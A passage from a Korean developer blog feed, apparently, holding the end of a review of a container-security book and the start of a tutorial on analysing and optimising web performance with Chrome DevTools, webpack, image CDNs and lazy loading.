</code></pre></div></div> <p>이 외에도 각각의 namespace별로 제한하는 방법을 사례와 함께 제시해주고 있어, 실무에서 도커를 활용하여 직접 컨테이너 환경을 구축하고 이를 감싸는 보안 경계를 강화하고자 할 때 참고할 수 있습니다.</p> <h4 id="컨테이너-이미지와-보안">컨테이너 이미지와 보안</h4> <p>이미지는 <code class="language-plaintext highlighter-rouge">컨테이너 실행에 필요한 파일과 설정 값</code> 등을 포함하고 있는 것으로, 상태값을 가지지 않고 변하지 않습니다. (<code class="language-plaintext highlighter-rouge">Immutable</code>) 하나의 컨테이너 이미지는 크게 두 부분으로 구성됩니다. 하나는 <code class="language-plaintext highlighter-rouge">루트 파일 시스템</code>이고, 다른 하나는 <code class="language-plaintext highlighter-rouge">이미지 설정 정보</code>입니다. 아래는 실제 컨테이너 이미지의 config.json 파일로, 여기에 컨테이너 프로세스의 접근을 제한할 자원들과 프로세스별마다 적용되는 namespace를 비롯한 컨테이너와 관련된 설정을 포함하고 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="code"><pre><span class="p">...</span>
<span class="dl">"</span><span class="s2">linux</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
<span class="dl">"</span><span class="s2">resource</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
<span class="dl">"</span><span class="s2">memory</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
<span class="dl">"</span><span class="s2">limit</span><span class="dl">"</span><span class="p">:</span> <span class="mi">1000000</span>
<span class="p">},</span>
<span class="dl">"</span><span class="s2">devices</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">allow</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
<span class="dl">"</span><span class="s2">access</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">rwm</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">],</span>
<span class="dl">"</span><span class="s2">namespaces</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">pid</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">network</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ipc</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">uts</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
<span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">mount</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">]</span>
<span class="p">}</span>  
 <span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>컨테이너 이미지에 접근할 수 있는 사용자는 해당 이미지 안에 있는 어떤 파일에도 접근할 수 있게 됩니다. 때문에, 이미지에 패스워드나 인증 토큰과 같은 민감한 정보를 포함하는 것은 보안 취약점에 해당되므로 지양해야 합니다. 또한, 꼭 필요하지 않은 패키지나 라이브러리, 실행 파일은 이미지에 추가하지 않도록 주의해야 합니다.</p> <p>추가적으로 이미지를 보관하는 레지스트리와 관련된 내용과, 이미지 서명, 배치(deployment) 시점의 보안 점검 주의 사항들을 책을 통해 확인할 수 있습니다.</p> <h4 id="컨테이너-방화벽">컨테이너 방화벽</h4> <p>모든 외부 공격은 네트워크를 통해 도달되므로, 네트워크 보안을 위해 <code class="language-plaintext highlighter-rouge">컨테이너 방화벽</code>을 설정할 수 있습니다. 컨테이너 방화벽은 컨테이너 간의 트래픽을 제한하는데, 이에 따라 승인된 객체 사이에서만 정보가 오갈 수 있게 됩니다. 또한, 규칙에서 벗어난 네트워크 연결 시도를 기록하고 보고하는 기능도 제공하는데 이러한 기록을 통해 혹시 모를 공격의 전조를 감지할 수 있기도 합니다.</p> <hr/> <p>이 책은 아래 범주에 속하는 독자를 대상으로 하고 있습니다.</p> <ul> <li><code class="language-plaintext highlighter-rouge">ps</code>나 <code class="language-plaintext highlighter-rouge">grep</code>, <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">chown</code>, <code class="language-plaintext highlighter-rouge">chmod</code> 등의 기본적인 리눅스 명령어에 익숙한 사람</li> <li><code class="language-plaintext highlighter-rouge">docker</code>나 <code class="language-plaintext highlighter-rouge">kubectl</code> 등의 도구를 통해 컨테이너 응용 프로그램을 실행하고 관리해본 경험이 있는 사람</li> </ul> <p>다만 특정 컨테이너에 종속되어 설명된다기보단, 여러 컨테이너 구현들이 공통의 특징들을 많이 공유한다는 점을 강조하고자 다양한 컨테이너 도구들을 사용하며 설명해주고 있습니다. 또한 그 근간이 되는 기술에 대한 설명과 다양한 예시를 함께 제공해주어, 초보자라도 차근차근 따라갈 수 있는 난이도의 책이라 생각됩니다. 책의 마지막 부분인 부록의 <strong>보안 점검 목록</strong> 항목들을 통해, 먼저 운영 중인 컨테이너의 보안을 점검하기 위한 현황표를 작성하고 역으로 필요한 부분 순으로 읽는 것도 이 책을 활용하는 좋은 방법일 것 같습니다.</p> <p>개인적으로는 전자의 경우는 해당되나, 도커, 쿠버네티스 등의 컨테이너 관련 실무 경험이 부족하여 읽는 동안 다소 모호하게 이해되는 내용이 많았습니다. 아직까진 <code class="language-plaintext highlighter-rouge">Ubuntu</code>의 <code class="language-plaintext highlighter-rouge">CentOS</code> 혹은 <code class="language-plaintext highlighter-rouge">Windows</code> 서버 관리 경험만 있고, 도커와 쿠버네티스 등의 컨테이너 도구를 활용한 경험이 없어 추후 실무에 활용하게 된다면 다시 참고할만한 책이라고 생각합니다.</p> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://docs.docker.com/engine/security/">Docker security</a></p> <p>📌 <a href="https://www.hanbit.co.kr/store/books/look.php?p_code=B8383749156">한빛출판사: Container Security</a></p>]]></content><author><name></name></author><category term="글또"/><category term="리뷰"/><category term="container"/><category term="security"/><summary type="html"><![CDATA["한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."]]></summary></entry><entry><title type="html">웹 성능 분석 및 최적화 기법 (with Chrome Developer Tools)</title><link href="https://chanmi-lee.github.io/articles/2021-01/website-spped-and-performance-optimization/" rel="alternate" type="text/html" title="웹 성능 분석 및 최적화 기법 (with Chrome Developer Tools)"/><published>2021-01-24T00:00:00+00:00</published><updated>2021-01-24T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-01/website-spped-and-performance-optimization</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-01/website-spped-and-performance-optimization/"><![CDATA[<figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/web-performance-480.webp 480w,/assets/img/posts/web-performance-800.webp 800w,/assets/img/posts/web-performance-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/web-performance.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h2 id="웹-성능-분석-및-최적화-기법-with-chrome-developer-tools">웹 성능 분석 및 최적화 기법 (with Chrome Developer Tools)</h2> <p>웹의 성능 최적화 방법은 크게 로딩 성능과 렌더링 성능을 최적화하는 방법으로 나누어 생각할 수 있습니다.</p> <p>여기에서 <code class="language-plaintext highlighter-rouge">로딩 성능</code>은 <strong>얼마나 빠르게 리소스를 로드하는지</strong> 를 의미하며, <code class="language-plaintext highlighter-rouge">렌더링 성능</code>은 <strong>얼마나 빠르게 화면을 렌더링하고 있는가</strong> 를 의미합니다. 웹의 성능은 사용자 경험에 상당한 영향을 끼치는 항목으로, 프론트엔드 개발 시 반드시 고려해야 하는 중요한 내용입니다.</p> <p>다양한 성능 최적화 방법이 있지만, 그 중에서도 크롬 개발자도구를 활용하여 웹 사이트의 로딩 성능과 렌더링 성능과 관련된 지표들을 살펴보고 이를 통해 어떻게 성능을 개선할 수 있는지 살펴보겠습니다.</p> <hr/> <h3 id="lighthouseaudit로-분석하기">Lighthouse(Audit)로 분석하기</h3> <p>먼저 분석하고자 하는 사이트에 들어가 개발자 도구의 <code class="language-plaintext highlighter-rouge">Lighthouse</code> 패널을 열고 <code class="language-plaintext highlighter-rouge">Generate report</code>를 누르면, 아래와 같이 분석 결과를 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/lighthouse-for-web-performance-480.webp 480w,/assets/img/posts/lighthouse-for-web-performance-800.webp 800w,/assets/img/posts/lighthouse-for-web-performance-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/lighthouse-for-web-performance.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>최상단에서 현재 웹 페이지를 <code class="language-plaintext highlighter-rouge">Performance</code>, <code class="language-plaintext highlighter-rouge">Accessibility</code>, <code class="language-plaintext highlighter-rouge">Best Practices</code>, <code class="language-plaintext highlighter-rouge">SEO</code>, <code class="language-plaintext highlighter-rouge">PWA</code>의 다섯가지 기준에 따라 분석 점수를 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/web-performance-of-us-480.webp 480w,/assets/img/posts/web-performance-of-us-800.webp 800w,/assets/img/posts/web-performance-of-us-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/web-performance-of-us.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>(<del>거의 0에 수렴하는 performance 점수.. (눈물)</del>)</p> <p>아래 구글의 점수와 비교해보면 그 차이를 바로 체감할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/web-performance-of-google-480.webp 480w,/assets/img/posts/web-performance-of-google-800.webp 800w,/assets/img/posts/web-performance-of-google-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/web-performance-of-google.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>이 중에서 Performance의 점수는 현재 페이지의 성능을 측정한 점수이며, 이는 Metrics 지표의 세부 항목을 기준으로 측정됩니다.</p> <ul> <li>First Contentful Paint</li> <li>Time to Interactive</li> <li>Speed Index</li> <li>Total Blocking Time</li> <li>Largest Contentful Paint</li> <li>Commulative Layout Shift</li> </ul> <p><code class="language-plaintext highlighter-rouge">Oppertunities</code>와 <code class="language-plaintext highlighter-rouge">Dignostics</code>는 현재 웹페이지의 문제점과 성능 최적화를 위한 가이드를 제시해주는 부분입니다.</p> <p><code class="language-plaintext highlighter-rouge">Opportunities</code>는 로딩 성능과 관련된 내용으로 어떻게 리소스를 더 빠르게 로딩할 수 있는지의 관점에서 개선 포인트를 나열해주고 있습니다. <code class="language-plaintext highlighter-rouge">Dignostics</code>는 렌더링 성능과 관련된 내용으로 그 개선점을 나열해주고 있습니다.</p> <p>각 항목의 상세 정보를 통해 리소스 별로 차지하는 비중을 확인할 수 있습니다. 예를 들어, <code class="language-plaintext highlighter-rouge">Opportunities</code>의 <code class="language-plaintext highlighter-rouge">Remove unused JavaScript</code> 항목을 선택하면, 어떤 리소스를 로딩하는데 오래 걸리는지, 각 사이즈는 어느정도인지 알 수 있습니다. 그러나 해당 리소스의 어느 부분이 문제가 되는지, 어떻게 개선해야 하는지 등에 관한 구체적인 정보는 제공되지 않습니다. (이어지는 <code class="language-plaintext highlighter-rouge">Performance</code> 패널을 통해 조금 더 구체적으로 확인이 가능합니다)</p> <p>마지막의 <code class="language-plaintext highlighter-rouge">Runtime Settings</code>에서는 검사를 실행한 환경에 대한 정보를 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/runtime-setting-in-lighthouse-480.webp 480w,/assets/img/posts/runtime-setting-in-lighthouse-800.webp 800w,/assets/img/posts/runtime-setting-in-lighthouse-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/runtime-setting-in-lighthouse.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h3 id="performance로-분석하기">Performance로 분석하기</h3> <p>Performance 패널에서는 <code class="language-plaintext highlighter-rouge">Timeline</code>을 기준으로 페이지가 로드되면서 실행되는 작업들에 관한 정보를 그래프와 화면들의 스냅샷으로 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/performance-for-web-page-480.webp 480w,/assets/img/posts/performance-for-web-page-800.webp 800w,/assets/img/posts/performance-for-web-page-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/performance-for-web-page.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <blockquote> <p>Frames</p> </blockquote> <p><code class="language-plaintext highlighter-rouge">Screenshots</code> 옵션을 활성화 한 경우 확인 가능하며, <code class="language-plaintext highlighter-rouge">Timeline</code>에 따른 렌더링 과정을 <code class="language-plaintext highlighter-rouge">스냅샷</code>을 통해 확인할 수 있습니다.</p> <blockquote> <p>Timings</p> </blockquote> <p>DCL, FP, FCP, LCP, L 등의 순서를 확인할 수 있으며 각각의 의미는 다음과 같습니다.</p> <ul> <li>DCL (DOMContentLoaded event) : HTML과 CSS parsing이 완료되는 시점으로 렌더 트리를 구성할 준비가 된 (DOM 및 CSSOM 구성이 끝난) 상황을 의미</li> <li>FP (First Paint) : 화면에 무언가 처음으로 그려지기 시작하는 순간</li> <li>FCP (First Contentful Paint) : 화면에 텍스트나 이미지가 출력되기 시작하는 순간</li> <li>FMP (First Meaningful Paint) : 사용자에게 의미있는 콘텐츠가 그려지기 시작하는 첫 순간으로, 콘텐츠 노출에 필요한 리소스(css, JavaScript file) 로드가 시작되고 스타일이 적용된 시점</li> <li>LCP (Largest Contentful Paint) : 뷰포트 내에서 가장 큰 이미지나 텍스트 블록이 렌더링되는 시점</li> <li>L (onload event) : HTML 상에 필요한 모든 리소스가 로드된 시점 <blockquote> <p><strong>LCP vs L (onload)</strong></p> <ul> <li><strong>LCP (사용자 경험 중심)</strong>: 사용자가 “페이지 로딩이 완료되었다”고 느끼는 시점. 화면 내 가장 큰 컨텐츠가 떴는지 확인합니다.</li> <li><strong>L (기술적 중심)</strong>: 브라우저가 모든 리소스(이미지, 스크립트 등)를 다 다운로드하고 처리를 끝낸 시점.</li> </ul> </blockquote> </li> </ul> <p>이 중 과거에는 FMP(First Meaningful Paint)가 중요했지만, 측정 기준의 모호함으로 인해 현재는 <strong>LCP(Largest Contentful Paint)</strong>가 더 중요한 지표로 간주됩니다.</p> <p>LCP는 사용자가 페이지의 메인 콘텐츠를 볼 수 있는 시점을 명확하게 나타내므로, 사용자 경험(UX) 최적화의 핵심 기준으로 삼아야 합니다. 이 과정에서 어떤 컨텐츠가 가장 먼저 노출되어야 하는가에 대한 논의가 필요하며 개발 과정에 반영되어야 합니다.</p> <blockquote> <p>Tips: <code class="language-plaintext highlighter-rouge">DOMContentLoaded event</code> 와 <code class="language-plaintext highlighter-rouge">onload event</code>는 <code class="language-plaintext highlighter-rouge">Network</code> 패널 하단에서도 확인할 수 있습니다.</p> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/DCL-and-onload-in-network-480.webp 480w,/assets/img/posts/DCL-and-onload-in-network-800.webp 800w,/assets/img/posts/DCL-and-onload-in-network-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/DCL-and-onload-in-network.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <blockquote> <p>Main</p> </blockquote> <p><code class="language-plaintext highlighter-rouge">Timeline</code>에 따른 이벤트와 그에 따른 부작업을 확인할 수 있습니다.</p> <p>각각의 막대는 이벤트를 나타내며, 폭이 넓을 수록 오래 걸린 이벤트입니다. 각 이벤트 아래쪽의 이벤트들은 상단의 이벤트로부터 파생된 이벤트입니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/main-in-performance-480.webp 480w,/assets/img/posts/main-in-performance-800.webp 800w,/assets/img/posts/main-in-performance-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/main-in-performance.gif" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <hr/> <h3 id="network로-분석하기">Network로 분석하기</h3> <p><code class="language-plaintext highlighter-rouge">Network</code>는 <code class="language-plaintext highlighter-rouge">Performance</code> 패널과 함께 레코딩되며, <code class="language-plaintext highlighter-rouge">웹 페이지가 로딩되는 동안 요청된 리소스 정보들</code>을 확인할 수 있습니다. 이 때 리소스 목록은 시간순으로 정렬되며, 아래와 같이 각 리소스의 서버 요청 대기 시간을 확인할 수 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/resource-detail-in-network-480.webp 480w,/assets/img/posts/resource-detail-in-network-800.webp 800w,/assets/img/posts/resource-detail-in-network-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/resource-detail-in-network.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <ul> <li>Queuing : 대기열에 쌓아둔 시간</li> <li>Stalled : 요청을 보내기 전의 대기 시간, 즉 서버와 커넥션을 맺기까지의 시간</li> <li>Waiting (TTFB) : 초기 응답(Time To First Byte)을 받기까지 소비한 시간, 즉 서버 왕복 시간</li> <li>Content Download : 리소스 다운에 소요된 시간</li> </ul> <hr/> <h2 id="성능-최적화-방법들">성능 최적화 방법들</h2> <blockquote> <p>❗ <strong>최대한 적게 요청하고, 최대한 빠르게 받아오기</strong></p> </blockquote> <p>앞에서 웹 성능 최적화는 크게 로딩 성능과 렌더링 성능로 분리하여 생각해볼 수 있다고 하였습니다. 로딩 성능과 렌더링 성능 각각의 관점에서 구체적인 최적화 방안들은 다음과 같습니다.</p> <hr/> <h3 id="css-js-최적화">CSS, JS 최적화</h3> <ul> <li><strong>CSS</strong>는 렌더링 차단 리소스이므로 HTML 문서 최상단(<code class="language-plaintext highlighter-rouge">&lt;head&gt;</code> 아래)에 배치합니다.</li> <li><strong>JS</strong>는 파싱과 렌더링을 차단할 수 있으므로 HTML 문서 최하단(<code class="language-plaintext highlighter-rouge">&lt;/body&gt;</code> 직전)에 작성하거나, <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> 태그의 <code class="language-plaintext highlighter-rouge">defer</code>, <code class="language-plaintext highlighter-rouge">async</code> 속성을 활용하여 비동기적으로 로드합니다.</li> </ul> <figure class="highlight"><pre><code class="language-html" data-lang="html"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="code"><pre><span class="nt">&lt;head&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"style.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div&gt;</span>...<span class="nt">&lt;/div&gt;</span>
    <span class="c">&lt;!-- &lt;/body&gt; 직전에 위치시키거나 defer/async 속성 활용 --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"app.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">defer</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</pre></td></tr></tbody></table></code></pre></figure> <p><strong>Why?</strong></p> <blockquote> <p>렌더 트리를 구성하기 위해서는 <code class="language-plaintext highlighter-rouge">DOM 트리</code>와 <code class="language-plaintext highlighter-rouge">CSSOM 트리</code>가 필요합니다. DOM 트리는 파싱 중 태그를 발견할 때마다 순차적 구성이 가능하나, CSSOM 트리는 CSS를 모두 해석해야 구성이 가능합니다. 때문에 CSS는 렌더링 차단 리소스라고 하며, 렌더링이 되지 않도록 항상 <code class="language-plaintext highlighter-rouge">&lt;head&gt;</code> 아래에 작성해야 합니다.</p> </blockquote> <p>또한, 외부 스타일시트를 가져올 때는 <code class="language-plaintext highlighter-rouge">@import</code>문을 지양해야합니다. <code class="language-plaintext highlighter-rouge">@import</code>문을 사용하면 브라우저는 스타일시트를 병렬로 다운로드 할 수 없기 때문에 로드 시간이 늘어날 수 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="o">/</span><span class="nx">_</span> <span class="nx">test</span><span class="p">.</span><span class="nx">css</span> <span class="nx">_</span><span class="o">/</span>
<span class="p">@</span><span class="nd">import</span> <span class="nf">url</span><span class="p">(</span><span class="dl">"</span><span class="s2">style.css</span><span class="dl">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>내부 스타일시트를 사용할 때에도 <code class="language-plaintext highlighter-rouge">&lt;head&gt;</code> 태그에 추가하여 사용합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="code"><pre><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
  <span class="o">&lt;</span><span class="nx">style</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/css</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="p">.</span><span class="nx">container</span> <span class="p">{</span>
      <span class="nx">background</span><span class="o">-</span><span class="nx">color</span><span class="p">:</span> <span class="nx">black</span><span class="p">;</span>   
    <span class="p">}</span>
  <span class="o">&lt;</span><span class="sr">/style</span><span class="err">&gt;
</span><span class="o">&lt;</span><span class="sr">/head&gt;</span>
</pre></td></tr></tbody></table></code></pre></figure> <h3 id="번들러-webpack를-통한-js-css-번들링-최적화">번들러 (webpack)를 통한 js, css 번들링 최적화</h3> <p>webpack과 같은 모듈 번들러를 사용하면 여러 개의 js, css를 하나의 번들 파일로 묶어 파일 요청 수를 줄일 수 있습니다. 더 나아가 <strong>Code Splitting(코드 분할)</strong> 을 통해 초기 로딩 시 필요한 파일만 로드하게 하거나, <strong>Minification(압축)</strong> 을 통해 파일 크기를 최소화하는 것이 중요합니다.</p> <p><strong>Code Splitting</strong>은 번들 파일을 여러 개의 청크(Chunk)로 나누어, 현재 페이지에 필요한 코드만 로드하고 나머지는 나중에 로드하도록 합니다. 이는 초기 로딩 속도를 비약적으로 향상시킬 수 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="code"><pre><span class="c1">// webpack.config.js 예시</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
<span class="c1">// ...</span>
<span class="na">optimization</span><span class="p">:</span> <span class="p">{</span>
<span class="na">splitChunks</span><span class="p">:</span> <span class="p">{</span>
<span class="na">chunks</span><span class="p">:</span> <span class="dl">'</span><span class="s1">all</span><span class="dl">'</span><span class="p">,</span> <span class="c1">// 공통 의존성을 별도 청크로 분리하여 캐싱 효율 증대</span>
<span class="p">},</span>
<span class="na">minimize</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 프로덕션 모드에서 자동으로 코드 압축 및 난독화 수행</span>
<span class="p">},</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></pre></figure> <h3 id="tree-shaking">Tree-shaking</h3> <p>외부 라이브러리에서 import를 할 때 모든 함수를 가져오지 않고 필요한 함수만 가져와서 사용할 수 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="c1">// before</span>
<span class="k">import</span> <span class="err">\</span><span class="nx">_</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">_</span><span class="p">.</span><span class="nf">map</span><span class="p">(...);</span>
<span class="nx">_</span><span class="p">.</span><span class="nf">filter</span><span class="p">(...);</span>

<span class="c1">// after</span>
<span class="k">import</span> <span class="p">{</span> <span class="nx">map</span><span class="p">,</span> <span class="nx">filter</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">lodash</span><span class="dl">'</span><span class="p">;</span>

<span class="nf">map</span><span class="p">(...);</span>
<span class="nf">filter</span><span class="p">(...);</span>
</pre></td></tr></tbody></table></code></pre></figure> <h3 id="이미지-사이즈-최적화">이미지 사이즈 최적화</h3> <p>개별 이미지 대신 이미지 스프라이트 사용 (<a href="https://www.w3schools.com/css/css_image_sprites.asp">CSS Image Sprites</a>)</p> <p>여러 개의 이미지를 합쳐 하나의 이미지로 제공하여 한 번 요청하고, 필요한 부분은 CSS의 background-position 속성을 사용하여 보여줍니다.</p> <h3 id="이미지-cdn을-통한-최적화">이미지 CDN을 통한 최적화</h3> <p>이미지 CDN(Content Delivery Network)을 사용하면 사용자와 가까운 서버에서 이미지를 서빙하여 로딩 속도를 높일 수 있습니다. 또한, CDN 서비스들은 실시간 이미지 처리(리사이징, 포맷 변환 등) 기능을 제공하여 기기에 최적화된 이미지를 전송하는 데 유용합니다.</p> <ul> <li><strong>자동 포맷 변환</strong>: 브라우저 지원 여부에 따라 WebP, AVIF 등 차세대 포맷으로 자동 변환</li> <li><strong>리사이징 &amp; 크롭</strong>: URL 파라미터로 필요한 크기만큼만 요청하여 전송 데이터 절약</li> </ul> <figure class="highlight"><pre><code class="language-html" data-lang="html"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="c">&lt;!-- 원본 이미지 (용량이 큼) --&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"https://mysite.com/images/hero.jpg"</span> <span class="na">alt=</span><span class="s">"Hero"</span> <span class="nt">/&gt;</span>

<span class="c">&lt;!-- CDN을 통해 최적화된 이미지 (리사이징 + WebP 변환) --&gt;</span>
<span class="c">&lt;!-- width=800, quality=auto, format=webp 옵션 적용 예시 --&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"https://cdn.mysite.com/images/hero.jpg?w=800&amp;q=auto&amp;f=webp"</span> <span class="na">alt=</span><span class="s">"Hero"</span> <span class="nt">/&gt;</span>
</pre></td></tr></tbody></table></code></pre></figure> <h3 id="이미지-preload--lazy-load">이미지 Preload &amp; Lazy load</h3> <p><strong>Preload</strong>는 현재 페이지에서 필요한 리소스(이미지, 스크립트, CSS 등)를 빠르게 로딩하기 위해 브라우저에게 우선순위를 알리는 방법입니다. 주로 LCP(Largest Contentful Paint)에 영향을 주는 메인 이미지나 폰트 파일 등을 미리 로드할 때 사용합니다.</p> <figure class="highlight"><pre><code class="language-html" data-lang="html"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="nt">&lt;head&gt;</span>
  <span class="c">&lt;!-- 이미지 프리로드 예시 --&gt;</span>
  <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"preload"</span> <span class="na">as=</span><span class="s">"image"</span> <span class="na">href=</span><span class="s">"hero-image.jpg"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</pre></td></tr></tbody></table></code></pre></figure> <p><strong>Lazy Load</strong>는 페이지 초기 로딩 시점에 필요하지 않은 리소스(스크롤해야 볼 수 있는 이미지 등)의 로딩을 지연시키는 기술입니다. 사용자가 해당 위치에 도달했을 때 리소스를 로드하여 초기 로딩 속도를 높이고 데이터 소모를 줄일 수 있습니다. 최신 브라우저에서는 <code class="language-plaintext highlighter-rouge">img</code> 태그의 <code class="language-plaintext highlighter-rouge">loading</code> 속성을 통해 간단하게 구현할 수 있습니다.</p> <figure class="highlight"><pre><code class="language-html" data-lang="html"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
</pre></td><td class="code"><pre><span class="c">&lt;!-- 브라우저 네이티브 Lazy Load --&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"example.jpg"</span> <span class="na">loading=</span><span class="s">"lazy"</span> <span class="na">alt=</span><span class="s">"example"</span> <span class="nt">/&gt;</span>
